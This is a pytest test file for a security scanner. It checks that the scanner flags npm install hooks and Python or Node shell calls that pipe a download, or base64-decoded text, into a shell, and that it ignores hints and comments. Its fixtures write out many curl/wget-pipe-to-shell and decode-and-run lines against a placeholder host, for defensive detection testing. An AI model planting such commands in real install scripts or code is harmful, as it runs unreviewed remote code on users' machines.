"""Download-and-run (and decode-and-run) commands outside shell scripts.

`curl … | bash` in `install.sh` fired ST-SHELL-PIPE-EXEC, but the same command as an npm
lifecycle script, or handed to `os.system` / `subprocess.run(..., shell=True)` / `execSync`, only
produced a capability and scored 0. An npm install script that fetches or decodes code and runs it
is a malicious indicator (like a binding.gyp substitution that does the same); a shell call in
Python or Node that pipes a download into a shell is a scored risky construct.

The same command printed as a hint, kept in a variable that is only echoed, written in a comment or
a README, or found only in test code, is not run and stays out of the score.
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from skilltotal.engine import analyze_directory
from skilltotal.models import Component, ThreatClass

NPM = "ST-INSTALL-NPM-REMOTE-EXEC"
PY = "ST-SHELL-PIPE-EXEC-PY"
NODE = "ST-SHELL-PIPE-EXEC-NODE"
SH = "ST-SHELL-PIPE-EXEC"
URL = "https://x.example.invalid/s.sh"


def _scan(tmp_path: Path, files: dict[str, str]):
    for name, text in files.items():
        path = tmp_path / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text, encoding="utf-8", newline="\n")
    return analyze_directory(tmp_path, Component(name="x", type="local", source=str(tmp_path)))


def _ids(report) -> set[str]:
    return {f.id for f in report.findings}


def _package(scripts: dict[str, str]) -> str:
    return json.dumps({"name": "x", "version": "1.0.0", "scripts": scripts}, indent=2)


# --- npm lifecycle scripts --------------------------------------------------------------------

NPM_POSITIVE = [
    {"preinstall": f"curl -fsSL {URL} | bash"},
    {"postinstall": f"curl -s {URL} | sh"},
    {"install": "wget -qO- https://x.example.invalid/s | sh"},
    {"prepare": f"curl -fsSL {URL} | sudo bash"},
    {"postinstall": "node -e \"eval(Buffer.from('Y29uc29sZS5sb2coMSk=','base64').toString())\""},
    {"preinstall": "echo Y29uc29sZS5sb2coMSk= | base64 -d | sh"},
    {"postinstall": f'sh -c "$(curl -fsSL {URL})"'},
]


@pytest.mark.parametrize("scripts", NPM_POSITIVE)
def test_an_npm_install_script_that_runs_fetched_or_decoded_code_is_malicious(tmp_path, scripts):
    report = _scan(tmp_path, {"package.json": _package(scripts)})
    finding = next(f for f in report.findings if f.id == NPM)
    assert finding.threat_class == ThreatClass.MALICIOUS_INDICATOR
    assert finding.evidence and finding.evidence[0].file == "package.json"
    assert list(scripts)[0] in finding.evidence[0].snippet
    assert report.verdict["has_malicious_indicators"]
    assert report.risk_score >= 50


def test_a_json_escape_does_not_hide_the_pipe(tmp_path):
    text = '{"name": "x", "scripts": {"preinstall": "curl -s ' + URL + ' \\u007c bash"}}'
    report = _scan(tmp_path, {"package.json": text})
    assert NPM in _ids(report)


NPM_NEGATIVE = [
    {"postinstall": "node build.js", "prepare": "tsc -p ."},
    # Scripts npm does not run on install.
    {"test": f"curl -s {URL} | sh", "bootstrap": f"curl -s {URL} | bash"},
    # A download that is saved, not run.
    {"postinstall": "curl -fsSL https://x.example.invalid/data.json -o data.json"},
]


@pytest.mark.parametrize("scripts", NPM_NEGATIVE)
def test_other_npm_scripts_are_not_flagged(tmp_path, scripts):
    report = _scan(tmp_path, {"package.json": _package(scripts)})
    assert NPM not in _ids(report)
    assert not report.verdict["has_malicious_indicators"]


# --- a shell script an npm install script runs ------------------------------------------------

FETCH_SCRIPT = f"#!/bin/sh\nset -e\necho 'Setting up...'\ncurl -fsSL {URL} | bash\n"


@pytest.mark.parametrize("hook", [
    {"postinstall": "bash install.sh"},
    {"preinstall": "sh ./scripts/setup.sh --quiet"},
    {"install": "./scripts/setup.sh"},
    {"postinstall": "node build.js && bash scripts/setup.sh"},
])
def test_an_install_script_that_runs_a_downloading_shell_script_is_malicious(tmp_path, hook):
    """The same download-and-run, one file away: `"postinstall": "bash install.sh"`."""
    script = next(w for w in hook[next(iter(hook))].split() if w.endswith(".sh"))
    report = _scan(tmp_path, {"package.json": _package(hook),
                              script.removeprefix("./"): FETCH_SCRIPT})
    finding = next(f for f in report.findings if f.id == NPM)
    assert finding.threat_class == ThreatClass.MALICIOUS_INDICATOR
    assert any(e.file == script.removeprefix("./") and e.line_start == 4 for e in finding.evidence)
    assert report.verdict["has_malicious_indicators"]
    assert report.risk_score >= 50


def test_a_decoding_shell_script_run_at_install_is_malicious(tmp_path):
    report = _scan(tmp_path, {
        "package.json": _package({"postinstall": "sh setup.sh"}),
        "setup.sh": "#!/bin/sh\necho Y29uc29sZS5sb2coMSk= | base64 -d | sh\n",
    })
    assert NPM in _ids(report)


@pytest.mark.parametrize("files", [
    # The script exists but no install script runs it (people run it by hand).
    {"package.json": _package({"build": "bash install.sh"}), "install.sh": FETCH_SCRIPT},
    # Run at install, but the download-and-run is only a comment or a printed hint.
    {"package.json": _package({"postinstall": "sh setup.sh"}),
     "setup.sh": f"#!/bin/sh\n# Manual install: curl -fsSL {URL} | bash\nexit 0\n"},
    {"package.json": _package({"postinstall": "sh setup.sh"}),
     "setup.sh": f'#!/bin/sh\nhint="curl -fsSL {URL} | bash"\necho "Install uv with: $hint"\n'},
])
def test_a_shell_script_that_does_not_run_a_download_at_install_is_not_flagged(tmp_path, files):
    report = _scan(tmp_path, files)
    assert NPM not in _ids(report)
    assert not report.verdict["has_malicious_indicators"]


def test_npm_documentation_and_test_fixtures_are_not_flagged(tmp_path):
    report = _scan(tmp_path, {
        "package.json": _package({"build": "tsc"}),
        "README.md": "```json\n" + _package({"preinstall": f"curl -s {URL} | bash"}) + "\n```\n",
        "tests/fixtures/evil/package.json": _package({"preinstall": f"curl -s {URL} | bash"}),
    })
    assert NPM not in _ids(report)
    assert not report.verdict["has_malicious_indicators"]


# --- Python shell calls -----------------------------------------------------------------------

PY_POSITIVE = [
    f'import os\nos.system("curl -fsSL {URL} | bash")\n',
    f'import os\nos.popen("wget -qO- {URL} | sh")\n',
    f'import subprocess\nsubprocess.run("curl -fsSL {URL} | sh", shell=True)\n',
    f'import subprocess\nsubprocess.check_call(["bash", "-c", "curl -s {URL} | bash"])\n',
    'import subprocess\nurl = "https://x.example.invalid/s.sh"\n'
    'subprocess.call(f"curl -s {url} | bash", shell=True)\n',
    'import subprocess as sp\nsp.Popen("curl -s " + URL + " | sh", shell=True)\n',
]


@pytest.mark.parametrize("source", PY_POSITIVE)
def test_python_shell_call_that_pipes_a_download_into_a_shell_is_scored(tmp_path, source):
    report = _scan(tmp_path, {"main.py": source})
    finding = next(f for f in report.findings if f.id == PY)
    assert finding.threat_class == ThreatClass.RISKY_CONSTRUCT
    assert finding.evidence[0].file == "main.py"
    assert report.risk_score > 0


PY_NEGATIVE = [
    f'print("Install uv with: curl -LsSf {URL} | sh")\n',
    f'HINT = "curl -LsSf {URL} | sh"\nprint(HINT)\n',
    f'import subprocess\nsubprocess.run(["curl", "-o", "s.sh", "{URL}"])\n',
    f'import os\n# os.system("curl -fsSL {URL} | bash")\nos.system("make")\n',
    'import subprocess\nsubprocess.run("ls | sort", shell=True)\n',
]


@pytest.mark.parametrize("source", PY_NEGATIVE)
def test_python_that_does_not_run_a_download_is_not_flagged(tmp_path, source):
    report = _scan(tmp_path, {"main.py": source})
    assert PY not in _ids(report)


def test_python_test_code_is_not_scored(tmp_path):
    report = _scan(tmp_path, {"tests/test_x.py": PY_POSITIVE[0]})
    assert PY not in _ids(report)


# --- Node shell calls -------------------------------------------------------------------------

NODE_POSITIVE = [
    f'const {{ execSync }} = require("child_process");\nexecSync("curl -fsSL {URL} | bash");\n',
    'const cp = require("child_process");\nconst u = "https://x.example.invalid/s";\n'
    "cp.exec(`curl -s ${u} | sh`);\n",
    f'const {{ spawn }} = require("child_process");\n'
    f'spawn("sh", ["-c", "wget -qO- {URL} | sh"], {{ stdio: "inherit" }});\n',
    'const child_process = require("child_process");\n'
    f'child_process.execSync("curl -s " + "{URL}" + " | bash");\n',
]


@pytest.mark.parametrize("source", NODE_POSITIVE)
def test_node_shell_call_that_pipes_a_download_into_a_shell_is_scored(tmp_path, source):
    report = _scan(tmp_path, {"index.js": source})
    finding = next(f for f in report.findings if f.id == NODE)
    assert finding.threat_class == ThreatClass.RISKY_CONSTRUCT
    assert finding.evidence[0].file == "index.js"
    assert report.risk_score > 0


NODE_NEGATIVE = [
    f'console.log("Install with: curl -fsSL {URL} | bash");\n',
    f'const {{ execSync }} = require("child_process");\n// execSync("curl -fsSL {URL} | bash");\n'
    'execSync("npm run build");\n',
    f'const {{ execSync }} = require("child_process");\nconst hint = "curl -s {URL} | sh";\n'
    'execSync("git status");\nconsole.log(hint);\n',
]


@pytest.mark.parametrize("source", NODE_NEGATIVE)
def test_node_that_does_not_run_a_download_is_not_flagged(tmp_path, source):
    report = _scan(tmp_path, {"index.js": source})
    assert NODE not in _ids(report)


# --- shell scripts: a hint kept in a variable -------------------------------------------------

def test_a_pipe_to_shell_kept_in_a_variable_that_is_only_echoed_is_not_run(tmp_path):
    script = (
        "#!/bin/bash\n"
        'uv_hint="curl -LsSf https://x.example.invalid/uv/install.sh | sh"\n'
        "if ! command -v uv >/dev/null; then\n"
        '  echo "uv is missing. Install it with: $uv_hint"\n'
        "  printf '%s\\n' \"${uv_hint}\"\n"
        "fi\n"
    )
    report = _scan(tmp_path, {"install.sh": script})
    assert SH not in _ids(report)
    assert report.risk_score == 0


def test_a_hint_assigned_in_a_case_arm_and_only_echoed_is_not_run(tmp_path):
    """Installers pick the hint per platform: `Linux) uv_hint="curl ... | sh" ;;`."""
    script = (
        "#!/bin/bash\n"
        'case "$(uname -s)" in\n'
        '  Darwin)               uv_hint="brew install uv" ;;\n'
        '  Linux)                uv_hint="curl -LsSf https://x.example.invalid/uv/i.sh | sh" ;;\n'
        '  MINGW*|MSYS*|CYGWIN*) uv_hint="see https://x.example.invalid/uv" ;;\n'
        "esac\n"
        'echo "uv is missing. Install it with: $uv_hint"\n'
    )
    report = _scan(tmp_path, {"install.sh": script})
    assert SH not in _ids(report)
    assert report.risk_score == 0


@pytest.mark.parametrize("arm", [
    '  Linux) cmd="curl -s {url} | sh" ;;',
    '  Linux) cmd="curl -s {url} | sh"; eval "$cmd" ;;',
])
def test_a_case_arm_command_that_is_run_still_fires(tmp_path, arm):
    script = ('#!/bin/sh\ncase "$(uname -s)" in\n' + arm.format(url=URL) + "\nesac\n"
              'echo "running $cmd"\neval "$cmd"\n')
    report = _scan(tmp_path, {"install.sh": script})
    assert SH in _ids(report)


@pytest.mark.parametrize("use", ['eval "$cmd"', 'bash -c "$cmd"', "sh -c \"${cmd}\""])
def test_a_pipe_to_shell_kept_in_a_variable_that_is_run_still_fires(tmp_path, use):
    script = f'#!/bin/sh\ncmd="curl -s {URL} | sh"\necho "running $cmd"\n{use}\n'
    report = _scan(tmp_path, {"install.sh": script})
    assert SH in _ids(report)


def test_a_plain_pipe_to_shell_line_still_fires(tmp_path):
    report = _scan(tmp_path, {"install.sh": f"#!/bin/sh\ncurl -fsSL {URL} | bash\n"})
    assert SH in _ids(report)
